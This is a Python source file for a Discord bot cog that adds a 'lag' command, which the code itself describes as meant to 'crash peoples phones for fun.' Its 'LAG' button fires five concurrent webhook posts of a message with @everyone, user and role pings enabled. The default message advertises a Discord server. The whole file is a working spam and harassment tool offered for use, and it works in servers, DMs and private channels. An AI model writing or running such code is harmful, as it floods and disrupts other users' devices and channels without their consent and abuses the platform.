import asyncio
import aiohttp
import discord
import tomllib
from discord import app_commands
import discord.ext.commands as commands
from utils.checks import enforce_blacklist
from utils.helpers import log_command

with open("config.toml", "rb") as f:
    _config = tomllib.load(f)

LAG_MESSAGE = _config.get("lag", {}).get("lag_msg", "LAGGED BY ZNE - https://discord.gg/4pQzcZxVXK")


async def _send_message_http(session: aiohttp.ClientSession, application_id: int, interaction_token: str, content: str):
    url = f"https://discord.com/api/v10/webhooks/{application_id}/{interaction_token}"
    payload = {"content": content, "allowed_mentions": {"parse": ["everyone", "users", "roles"]}}
    
    async with session.post(url, json=payload) as resp:
        return resp.status


class LagButton(discord.ui.LayoutView):
    def __init__(self, user_id: int):
        super().__init__(timeout=None)
        self.user_id = user_id

    container1 = discord.ui.Container(
        discord.ui.ActionRow(
            discord.ui.Button(
                style=discord.ButtonStyle.secondary,
                label="LAG",
                emoji="<:evil_brown:1502233792193232987>",
                custom_id="send_lag_button",
            ),
        ),
    )

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        if interaction.data.get("custom_id") == "send_lag_button":
            await interaction.response.defer()

            app_id = interaction.client.application_id
            token = interaction.token

            async with aiohttp.ClientSession() as session:
                tasks = [
                    _send_message_http(session, app_id, token, LAG_MESSAGE)
                    for _ in range(5)
                ]
                await asyncio.gather(*tasks)

            return False
        return True


class LagCog(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @app_commands.command(name="lag", description="crash peoples phones for fun.")
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    @app_commands.check(enforce_blacklist)
    async def lag(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True, thinking=True)
        await interaction.followup.send(view=LagButton(interaction.user.id), ephemeral=True)
        await log_command(interaction, "lag", "user lagged a server")


async def setup(bot: commands.Bot):
    await bot.add_cog(LagCog(bot))